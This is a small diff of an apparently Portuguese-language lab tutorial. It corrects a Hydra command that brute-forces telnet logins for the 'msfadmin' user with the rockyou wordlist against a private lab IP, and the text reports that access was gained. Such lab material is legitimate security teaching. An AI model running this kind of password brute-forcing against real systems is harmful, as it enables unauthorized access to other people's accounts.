@@ -43,7 +43,7 @@ Vamos utilizar a ferramenta Hydra para fazer esse brute force dentro do servidor
 Vamos entrar na pasta do kali /user/share/wordlists e fazer um gunzip do rockyou.
 
 ```
-hydra -l msfadmin -P rockyou.txt telnet -V 
+hydra -l msfadmin -P rockyou.txt 10.0.2.4 telnet -V 
 ```
 
 Através do hidra e de senhas já conhecidas em uma wordlist conseguimos obter o acesso ao servidor 
